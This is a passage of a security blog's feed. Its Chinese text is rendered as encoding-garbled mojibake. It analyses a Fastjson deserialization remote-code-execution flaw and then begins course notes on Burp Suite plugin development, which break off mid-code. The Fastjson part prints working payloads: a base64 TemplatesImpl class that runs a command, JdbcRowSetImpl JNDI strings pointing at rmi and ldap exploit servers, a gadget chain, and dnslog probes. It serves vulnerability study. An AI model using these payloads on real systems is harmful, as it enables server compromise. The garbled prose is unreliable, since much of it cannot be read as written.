wvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="</span>],<span class="string">'_name'</span>:<span class="string">'a.b'</span>,<span class="string">'_tfactory'</span>:&#123; &#125;,<span class="string">"_outputProperties"</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="å†çª¥Payload"><a href="#å†çª¥Payload" class="headerlink" title="å†çª¥Payload"></a>å†çª¥Payload</h2><p>&emsp;&emsp; è§‚å¯Ÿå‘ç°è¿™ä¸ªpayloadç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œ<code>@type</code>ã€<code>dataSourceName</code>ã€<code>autoCommint</code>ã€‚ç¬¬ä¸€ä¸ª<code>@type</code>å‰é¢å·²ç»æåŠäº†æ˜¯è·å–å®ä¾‹åŒ–ç±»ï¼Œ<code>dataSourceName</code>å’Œ<code>autoCommit</code>æˆ‘ä»¬çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload =   <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">              <span class="string">"\"dataSourceName\":\"rmi://localhost:1090/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; å¤§è‡´æ„æ€ï¼šä½¿ç”¨è¯¥æ–¹æ³•çš„åç§°ç»‘å®šåˆ°<code>JNDIå‘½åæœåŠ¡</code>ä¸­çš„<code>DataSource</code>å¯¹è±¡ä¸Šï¼Œåº”ç”¨ç¨‹åºå°±å¯ä»¥ä½¿ç”¨è¯¥åç§°è¿›è¡ŒæŸ¥æ‰¾ï¼Œæ£€ç´¢ç»‘å®šåˆ°å®ƒçš„DataSourceå¯¹è±¡ã€‚<br><img src="https://img-blog.csdnimg.cn/20200720140337267.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">&emsp;&emsp; è®¾ç½®<code>AutoCommit</code>åï¼Œä¼š<code>è‡ªåŠ¨æäº¤å†…å®¹</code>ã€‚è®¾ç½®è¿™ä¸ªå±æ€§ä¹‹åï¼ŒJNDIæ‰¾åˆ°å¯¹åº”èµ„æºï¼Œå¯¹è‡ªåŠ¨æäº¤å†…å®¹ï¼Œè¯»è€…åæœŸå¯ä»¥è¯•è¯•åˆ é™¤è¿™ä¸ªå±æ€§æ˜¯ä¸ä¼šè§¦å‘æ¼æ´çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/20200720140401249.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>çŸ¥é“ä¸Šé¢è¿™äº›ç‰¹æ€§åï¼Œæ ¹æ®ç‰¹ç‚¹æ„é€ ç­‰ä»·ä»£ç </strong><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">å›½å¤–ä»‹ç»JdbcRowSet ä½¿ç”¨æ–¹æ³•çš„ä¸€ä¸ªå°æ¡ˆä¾‹ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ã€‚</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jdbcRowSet.setDataSourceName(<span class="string">"ldap://127.0.0.1:1389/Exploit"</span>);</span><br><span class="line">            jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="æ¼æ´æˆå› åˆ†æ"><a href="#æ¼æ´æˆå› åˆ†æ" class="headerlink" title="æ¼æ´æˆå› åˆ†æ"></a>æ¼æ´æˆå› åˆ†æ</h1><p>&emsp;&emsp; JSON#parse()æ–¹æ³•ä¼šè°ƒç”¨<code>DefaultJSONParser#parse()</code>ï¼Œåœ¨å®ä¾‹åŒ–DefaultJSONParserç±»æ˜¯ä¼šå°†è¾“å…¥æ•°æ®ä½¿ç”¨å®ä¾‹åŒ–JSONScannerç±»ä¼ å…¥ï¼Œå¹¶åŒæ—¶ä¼ å…¥é»˜è®¤ç¼ºçœé…ç½®<code>features</code>ã€‚<br><img src="https://img-blog.csdnimg.cn/20200720150738738.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200720150903703.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; è¿™ä¸ª lexer å±æ€§å®é™…ä¸Šæ˜¯åœ¨ DefaultJSONParser å¯¹è±¡è¢«å®ä¾‹åŒ–çš„æ—¶å€™åˆ›å»ºçš„ã€‚<br><img src="https://img-blog.csdnimg.cn/20200720151203563.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; DefaultJSONParseråœ¨å®ä¾‹åŒ–æ—¶ä¼šè¯»å–å½“å‰å­—ç¬¦<code>ch={</code>ï¼Œæ‰€ä»¥<code>lexer.token()=12</code>ã€‚<br><img src="https://img-blog.csdnimg.cn/20200720151810322.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/2020072015182461.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; è·³è½¬12ä¼šåˆ›å»ºJSONObjectç±»å¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨ <code>DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>æ–¹æ³•å»è§£æã€‚<br><img src="https://img-blog.csdnimg.cn/2020072015285868.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; DefaultJSONParser#parseObjectå‰é¢ä¼šåšä¸€ä¸ªç®€å•åˆ¤æ–­<code>lexer.token()</code>ï¼Œç„¶åè¯»å–å­—ç¬¦åˆ¤æ–­æ˜¯å¦<code>ch==&#39;&quot;&#39;</code>ï¼ŒTRUEå°±è·å–å…¶ä¸­çš„å­—æ®µçš„å€¼<code>@type</code>å¹¶ç´§æ¥ç€åˆ¤æ–­<code>key == JSON.DEFAULT_TYPE_KEY</code>ç›¸ç­‰ã€‚<br><img src="https://img-blog.csdnimg.cn/20200720153408265.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200720170453343.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200720171815712.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; æ¥ä¸‹å»è¿›å…¥ååºåˆ—åŒ–é˜¶æ®µ<code>deserializer#deserialze()</code>â€“&gt;<code>parseRest()</code>â€“&gt;<code>fieldDeser#setValue</code>â€“&gt;ä¸€ç³»åˆ—åå°„è°ƒç”¨â€“&gt;<code>JdbcRowSetImpl#setAutoCommit()</code>è§¦å‘æ¼æ´ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200720173838924.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200720174044552.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200720174142800.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200720174203729.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200720174332739.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>æœ€åå¾—åˆ°Gadget chainå¦‚ä¸‹</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> *      JSON.parse()</span></span><br><span class="line"><span class="comment"> *          DefaultJSONParser.parse()</span></span><br><span class="line"><span class="comment"> *              DefaultJSONParser.parseObject()</span></span><br><span class="line"><span class="comment"> *                  JavaBeanDeserializer.deserialze()</span></span><br><span class="line"><span class="comment"> *                      JavaBeanDeserializer.parseRest()</span></span><br><span class="line"><span class="comment"> *                          FieldDeserializer.setValue()</span></span><br><span class="line"><span class="comment"> *                              Reflect.invoke()</span></span><br><span class="line"><span class="comment"> *                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720185616310.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="DNSLOGçš„ä¸€ä¸ªå°ç‚¹"><a href="#DNSLOGçš„ä¸€ä¸ªå°ç‚¹" class="headerlink" title="DNSLOGçš„ä¸€ä¸ªå°ç‚¹"></a>DNSLOGçš„ä¸€ä¸ªå°ç‚¹</h1><p>&emsp;&emsp; å®æˆ˜æŒ–æ˜fastjsonæ¼æ´çš„æ—¶å€™æ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•ï¼Œæ¢æµ‹Fastjsonæ˜¯ç”¨dnslogæ–¹å¼ï¼Œæ¢æµ‹åˆ°äº†å†ç”¨RCE Payloadå»ä¸€ä¸ªä¸€ä¸ªæ‰“ã€‚ä½†æ˜¯æœ¬äººåœ¨æœ¬åœ°ç¯å¢ƒæµ‹è¯•çš„æ—¶å€™å‘ç°äº†å‡ ä¸ªä¸åŒç‚¹ï¼Œfastjsonçš„ç‰ˆæœ¬ä¸åŒï¼Œä¸åŒçš„payloadæˆåŠŸæ¦‚ç‡æ˜¯ä¸åŒçš„ã€‚è‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™æ ·å­ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡<a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">é€šè¿‡dnslogæ¢æµ‹fastjsonçš„å‡ ç§æ–¹æ³•</a>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç›®å‰æœ€æ–°ç‰ˆ1.2.72ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨1.2.36 &lt; fastjson &lt;= 1.2.72</span></span><br><span class="line">String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">        <span class="string">":\"http://9s1euv.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line"><span class="comment">// å…¨ç‰ˆæœ¬æ”¯æŒ fastjson &lt;= 1.2.72</span></span><br><span class="line">String payload1 = <span class="string">"&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br><span class="line">String payload2 = <span class="string">"&#123;\"@type\":\"java.net.Inet6Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br></pre></td></tr></table></figure><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://www.b1ue.cn/archives/184.html" target="_blank" rel="noopener">http://www.b1ue.cn/archives/184.html</a><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html</a><br><a href="https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html" target="_blank" rel="noopener">https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html</a><br><a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/</a><br><a href="https://www.freebuf.com/news/232758.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232758.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Fastjsonè¿™æ¬¾å›½å†…çŸ¥åçš„è§£æjsonçš„ç»„ä»¶ï¼Œç¬”è€…åœ¨æ­¤å°±ä¸å¤šä»‹ç»ï¼Œç½‘ç»œä¸Šæœ‰å¾ˆå¤šåˆ†æå­¦ä¹ fastjsonååºåˆ—åŒ–
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ååºåˆ—åŒ– Java" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java/"/>
    
  </entry>
  
  <entry>
    <title>JDSRCå®‰å…¨è¯¾ç¬”è®°</title>
    <link href="https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/"/>
    <id>https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-20T11:01:42.000Z</published>
    <updated>2020-07-20T11:21:37.792Z</updated>
    
    <content type="html"><![CDATA[<p>ï»¿# ç¬¬ä¸€æœŸ</p><h2 id="é€»è¾‘æ¼æ´æŒ–æ˜"><a href="#é€»è¾‘æ¼æ´æŒ–æ˜" class="headerlink" title="é€»è¾‘æ¼æ´æŒ–æ˜"></a>é€»è¾‘æ¼æ´æŒ–æ˜</h2><p>&emsp;&emsp; é€»è¾‘æ¼æ´ä¸­çš„è®¤è¯ç¼ºå¤±å’Œè®¤è¯ç¼ºé™·æ¼æ´ï¼Œä¸»è¦æŒ‡åŠŸèƒ½çº§è®¿é—®æ§åˆ¶ç¼ºå¤±ï¼Œå‡ºç°ä»»æ„å¢åˆ æ”¹æŸ¥ç”¨æˆ·ä¿¡æ¯çš„æƒ…å†µã€‚å®é™…ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œè¿™ç±»æ¼æ´å¤§æ¦‚ä¸¤ä¸ªæˆå› ï¼Œä¸Šçº¿å‰æ²¡æœ‰åšå¥½è®¤è¯å¤„ç†ï¼Œæˆ–æƒé™ç¯èŠ‚æ§åˆ¶ä¸åˆ°ä½ã€‚åŸºäºå·¥å…·å¼€å‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸŸåä¿¡æ¯æ”¶é›†ã€ç«™ç‚¹ä¿¡æ¯çˆ¬å–ã€è§„åˆ™çš„åˆ†æä¸æå–ï¼Œä»¥åŠæ‰¹é‡å¤„ç†ç»“æœåˆ†æä¸å±•ç¤ºå››ä¸ªç¯èŠ‚å¿«é€Ÿå‘ç°è®¤è¯ç¼ºå¤±æ¼æ´å’Œè®¤è¯ç¼ºé™·æ¼æ´ã€‚</p><h1 id="ç¬¬äºŒæœŸ"><a href="#ç¬¬äºŒæœŸ" class="headerlink" title="ç¬¬äºŒæœŸ"></a>ç¬¬äºŒæœŸ</h1><h2 id="åŸºäº-burpsuiteçš„webé€»è¾‘æ¼æ´æ’ä»¶å¼€å‘"><a href="#åŸºäº-burpsuiteçš„webé€»è¾‘æ¼æ´æ’ä»¶å¼€å‘" class="headerlink" title="åŸºäº burpsuiteçš„webé€»è¾‘æ¼æ´æ’ä»¶å¼€å‘"></a>åŸºäº burpsuiteçš„webé€»è¾‘æ¼æ´æ’ä»¶å¼€å‘</h2><p>Burp Suiteä½œä¸ºwebåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•é›†æˆå¹³å°,å¸¸è¢«ç”¨æ¥è¿›è¡Œç½‘ç«™æ¸—é€æµ‹è¯•ã€‚BurpSuite æä¾›äº†æ’ä»¶å¼€å‘æ¥å£ï¼Œæ”¯æŒJavaã€Pythonã€Rubyè¯­è¨€çš„æ‰©å±•ã€‚è™½ç„¶ BApp Store ä¸Šé¢å·²ç»æä¾›äº†å¾ˆå¤šæ’ä»¶ï¼Œå…¶ä¸­ä¹Ÿä¸ä¹ä¼˜ç§€å¥½ç”¨çš„æ’ä»¶ï¼Œï¼ˆæ¨èå‡ ä¸ªä¸ªäººæ„Ÿè§‰å¥½çš„æ’ä»¶ï¼‰CO2,Logger++,Autorize,XSS Validatorã€‚ä½†æ˜¯é€šç”¨åŒ–çš„å·¥å…·æ— æ³•å®Œå…¨ç¬¦åˆwebå®‰å…¨æµ‹è¯•äººå‘˜çš„ç‰¹å®šéœ€æ±‚ã€‚</p><p>1ã€ä¸ºä»€ä¹ˆè¦ç‹¬ç«‹å¼€å‘æ’ä»¶<br>2ã€å¼€å‘ç¯å¢ƒé…ç½®è¯´æ˜ï¼›<br>3ã€æ’ä»¶å¼€å‘å…³é”®æ¥å£çš„ä½¿ç”¨å®ä¾‹ï¼›<br>4ã€é€»è¾‘æ¼æ´æ£€æµ‹æ’ä»¶å¼€å‘æ¢è®¨ï¼›</p><p>1.ä¸ºä»€ä¹ˆè¦ç‹¬ç«‹å¼€å‘æ’ä»¶<br>éšç€å‚å•†å®‰å…¨æ„è¯†å¢å¼ºï¼Œä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œå¤§å¤šæ•°çº¿ä¸Šä¸šåŠ¡é€šè¿‡httpsä¼ è¾“ï¼Œä¼ è¾“æµé‡åŠ å¯†ã€‚æ— æ³•åšä¸­é—´äººæ”»å‡»äº†å°±ï¼ŒæœåŠ¡ç«¯ï¼Œæ•°æ®åº“ä¸­çš„æ•æ„Ÿæ•°æ®åŠ å¯†å­˜å‚¨ï¼Œè®¿é—®æ§åˆ¶å—é™ï¼Œå³ä½¿æ‹¿åˆ°æ•°æ®åº“ä¹Ÿæ— æ³•æ‹¿åˆ°æ˜æ–‡æ•°æ®ã€‚ä½†æ˜¯æ•°æ®åœ¨å®¢æˆ·ç«¯æœ€ç»ˆè¦å±•ç¤ºç»™ç”¨æˆ·ï¼Œå¿…ç„¶æ˜æ–‡å±•ç°ã€‚ä¼ ç»Ÿçš„å®‰å…¨é˜²å¾¡è®¾å¤‡å’Œæªæ–½å¯¹é€»è¾‘æ¼æ´æ”¶æ•ˆç”šå¾®ï¼Œç°åœ¨æ”»å‡»è€…æ›´å€¾å‘äºåœ¨å®¢æˆ·ç«¯åˆ©ç”¨æ­¤ç±»æ¼æ´ã€‚è€Œé€»è¾‘æ¼æ´ç§ç±»å¾ˆå¤šï¼Œé€šç”¨åŒ–çš„å·¥å…·æ— æ³•å®Œå…¨ç¬¦åˆwebå®‰å…¨æµ‹è¯•äººå‘˜çš„ç‰¹å®šéœ€æ±‚ã€‚ä¸€ä¸ªä¸šåŠ¡çš„é€»è¾‘æ¼æ´æŠ½è±¡å‡ºæ¥çš„æ¨¡å‹ï¼Œéš¾ä»¥åœ¨å…¶ä»–ä¸šåŠ¡å±‚è¿›è¡Œæ‰¹é‡å¤„ç†ï¼Œé€šç”¨çš„è§£å†³æ–¹æ¡ˆå¾€å¾€æ•ˆæœä¸ä½³ã€‚ä½†æ˜¯ä¸€ä¸ªä¸šåŠ¡å±‚æŠ½è±¡å‡ºæ¥çš„æ¨¡å‹ï¼Œåœ¨å…¶è‡ªèº«ç«™ç‚¹å¾€å¾€å…·æœ‰é€šç”¨æ€§ã€‚ä¾‹å¦‚ï¼ŒæŸURLå­˜åœ¨è¶Šæƒï¼Œå¯èƒ½è¯¥ç«™ç‚¹å…¶ä»–URLä¹Ÿå¯èƒ½å­˜åœ¨ç±»ä¼¼çš„é—®é¢˜ã€‚æˆ‘ä»¬åŸºäºè¯¥URLç‰¹å¾ï¼Œå¼€å‘burpsuiteæ’ä»¶ï¼Œæ‰¹é‡æ‰«æè¯¥ç«™ç‚¹ï¼Œå°±èƒ½æ›´å…¨é¢çš„å‘ç°åŒç±»é—®é¢˜ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰å¿…è¦æ ¹æ®è‡ªå·±çš„ä¸šåŠ¡éœ€æ±‚ï¼Œè‡ªå·±èƒ½å¤Ÿç‹¬ç«‹å¼€å‘æ’ä»¶ã€‚</p><p>2.å¼€å‘ç¯å¢ƒé…ç½®<br>Burpæ”¯æŒJavaã€Pythonã€Rubyè¯­è¨€çš„æ‰©å±•ï¼Œæœ¬æ¬¡è®²åº§ä»¥pythonç¯å¢ƒä¸º ä¾‹è¿›è¡Œè¯´æ˜ã€‚Burpsuite æ˜¯è¿è¡Œåœ¨javaç¯å¢ƒï¼Œæ‰€æœ‰çš„åº“æ˜¯javaæ‰€å†™ã€‚Pythonä½œä¸ºå¼€å‘è¯­è¨€ï¼Œè°ƒç”¨Javaåº“å°±è¦ç”¨åˆ°Jythonã€‚</p><p>ä»¥MacOSä¸º ä¾‹å­è¿›è¡Œè¯´æ˜ï¼š<br>brew install jythonï¼Œå°±å¯ä»¥äº†ï¼ŒBurpsuite Jythonç¯å¢ƒçš„é…ç½®ï¼šExtender -&gt; options -&gt; python Environment -&gt; select file,å¯¼å…¥ä¸‹è½½å¥½çš„jython jaråŒ…ã€‚<img src="https://img-blog.csdnimg.cn/20200207154012356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>3.ï¼šæ’ä»¶å¼€å‘å…³é”®æ¥å£çš„ä½¿ç”¨å®ä¾‹ï¼Œé‡ç‚¹è®²å‡ ä¸ªæ¥å£</p><p>APIæ¥å£æŸ¥é˜…å¯ä»¥ä»ä»¥ä¸‹æ‹¿åˆ°ï¼š<br>APIæ¥å£æ–‡æ¡£å¯ä»¥åœ¨burpsuite çš„Extender -&gt; APIs<br>ä¹Ÿå¯ä»¥é€šè¿‡<a href="https://portswigger.net/burp/extender/api/index.htmlè¿›è¡ŒæŸ¥é˜…ã€‚" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.htmlè¿›è¡ŒæŸ¥é˜…ã€‚</a><br>IBurpExtender<br>IBurpExtenderæ˜¯Burpsuiteæ’ä»¶çš„å…¥å£ï¼Œæ‰€æœ‰æ’ä»¶çš„å¼€å‘éƒ½å¿…é¡»è¦å®ç°ã€‚<br>å½“æ’ä»¶è¢«å»ºç«‹ä»¥åï¼ŒregisterExtenderCallbacksä¹Ÿéœ€è¦å®ç°ã€‚<br>ä»£ç å¦‚ä¸‹ï¼šclass BurpExtender(IBurpExtender):<br>def registerExtenderCallbacks(self, callbacks):<br>å‚æ•°callbackså¯è·å–æ ¸å¿ƒåŸºç¡€åº“,ä¾‹å¦‚æ—¥å¿—ï¼Œè¯·æ±‚ï¼Œè¿”å›å€¼ä¿®æ”¹ç­‰ã€‚<br>IExtensionHelpers:<br>æä¾›äº†ç¼–å†™æ‰©å±•ä¸­å¸¸ç”¨çš„ä¸€äº›é€šç”¨å‡½æ•°ï¼Œæ¯”å¦‚ç¼–è§£ç ã€æ„é€ è¯·æ±‚ã€è·å–è¯·æ±‚å‚æ•°ï¼Œè·å–è¯·æ±‚å¤´ç­‰ã€‚å¦‚ï¼šIRequestInfo analyzeRequest(byte[] request)<br>é€šè¿‡analyzeRequestå‡½æ•°ï¼Œå¯ä»¥æ‹¿åˆ°è¯·æ±‚çš„ç»†èŠ‚ã€‚<br>é€šè¿‡å¦‚ä¸‹å‡ ä¸ªæ¥å£æ–¹æ³•å¯ä»¥æ‹¿åˆ°ã€‚<br><img src="https://img-blog.csdnimg.cn/20200207154237626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>IHttpRequestResponse: è¿™ä¸ªæ¥å£åŒ…å«äº†æ¯ä¸ªè¯·æ±‚å’Œå“åº”çš„ç»†èŠ‚ã€‚åœ¨Brupsuiteä¸­çš„æ¯ä¸ªè¯·æ±‚æˆ–è€…å“åº”éƒ½æ˜¯IHttpRequestResponseå®ä¾‹ã€‚é€šè¿‡getRequest()ï¼Œ getResponse()æ–¹æ³•å¯ä»¥è·å–è¯·æ±‚å’Œå“åº”çš„ç»†èŠ‚ä¿¡æ¯ã€‚</p><p>ä»¥registerHttpListenerä¸ºä¾‹è¿›è¡Œä»£ç è¯´æ˜ï¼š</p><p><img src="https://img-blog.csdnimg.cn/2020020715432066.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨user å’Œ webserverä¹‹é—´å»ºç«‹ç›‘å¬ï¼Œè°ƒç”¨HttpListeneræ¥å£ã€‚è·å–è¯·æ±‚ï¼Œå“åº”çš„æ—¥å¿—ã€‚<br>å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œæœ€é‡è¦çš„æ˜¯è¿™ä¸ªæ–¹æ³•ï¼š    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">register ourselves as an HTTP listener callbacks.registerHttpListener(self)</span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        ## è®¾ç½®æ’ä»¶å</span><br><span class="line">        self._callbacks.setExtensionName(&quot;getTheRequest&quot;)</span><br></pre></td></tr></table></figure><pre><code> # //å¦‚æœæ²¡æœ‰æ³¨å†Œï¼Œä¸‹é¢çš„processHttpMessageæ–¹æ³•æ˜¯ä¸ä¼šç”Ÿæ•ˆçš„ã€‚å¤„ç†è¯·æ±‚å’Œå“åº”åŒ…çš„æ’ä»¶ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¿…è¦çš„   callbacks.registerHttpListener(self)### processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)ï¼Œ### 